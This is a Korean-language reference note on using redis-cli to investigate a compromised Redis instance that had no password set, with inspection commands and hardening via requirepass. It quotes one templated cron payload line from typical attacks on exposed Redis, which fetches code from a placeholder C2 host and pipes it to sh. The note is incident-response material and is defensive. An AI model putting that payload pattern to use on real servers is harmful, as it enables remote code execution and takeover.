---
command: redis-cli
category: DATABASE
aliases: [redis]
tags:
  - linux/process
  - task/inspect
  - task/diagnose
  - topic/troubleshooting
  - topic/security
  - privilege/user
related: ["[[psql]]", "[[docker]]", "[[iptables]]", "[[grep]]"]
distro: 전체 (redis / redis-tools)
verified: Redis 7 (alpine 컨테이너, 사고 대응 세션)
updated: 2026-08-01
---

# redis-cli

- Redis 대화형 클라이언트
- 어원: **Re**mote **Di**ctionary **S**erver + **cli**
- 무인증(`requirepass` 미설정) 노출 시 cron 페이로드 기록 등 2차 침해 대상

---

## redis-cli

```bash
redis-cli <서브명령>

# Examples
redis-cli CONFIG GET dir              # 저장 디렉터리 확인
redis-cli CONFIG GET dbfilename       # RDB 파일명 확인
redis-cli CONFIG GET save             # 저장 정책 확인
redis-cli --scan --pattern '*'        # 전체 키 조회 (비차단)
redis-cli GET backup1                 # 키 값 조회
redis-cli PING                        # 응답 확인 (NOAUTH → 인증 필요)
redis-cli SLOWLOG GET 20              # 느린 쿼리 이력
```

### 명령어 설명
- 사용 목적
	- 키·설정·이력 조회를 통한 Redis 침해 조사 시 사용
	- 컨테이너 내부는 `docker exec <ID> redis-cli ...` 로 실행 → [[docker]]
- 특이사항
	- **노출 Redis 공격의 정형 키** `backup1`~`backup4` → cron 문법 페이로드 기록
		- 예: `*/2 * * * * root <다운로더> http://<C2>/... | sh`
	- `CONFIG GET dir`/`dbfilename` 기본값 유지 → cron 디렉터리 기록 시도 실패 정황
	- `PING` 응답이 `NOAUTH` → `requirepass` 설정됨 (재발 방지 목표 상태)
	- `--scan`은 `KEYS *`와 달리 커서 순회 → 대규모 키에서도 비차단
	- `SLOWLOG`는 순환 버퍼 → 이력 부재 시 공격 명령 복원 불가

### 서브명령
- `CONFIG GET <param>` : 런타임 설정 조회
- `--scan --pattern <glob>` : 키 비차단 순회
- `GET <key>` : 키 값 조회
- `PING` : 생존·인증 확인
- `SLOWLOG GET <n>` : 느린 쿼리 최근 n건

---

## 재발 방지 (인증 설정)

```bash
redis-server --requirepass "<비밀번호>" --appendonly yes
```

- `--requirepass` 미설정 시 무인증 → 노출 즉시 침해 위험
- 자격증명 생성: `openssl rand -base64 32`

---

## 연관 명령어
- [[psql]] : 동일 사고 1차 침해 대상(PostgreSQL) 조회
- [[docker]] : 컨테이너 내 redis-cli 실행
- [[iptables]] : Redis 페이로드 C2 아웃바운드 차단
- [[grep]] : 페이로드 키 값 필터
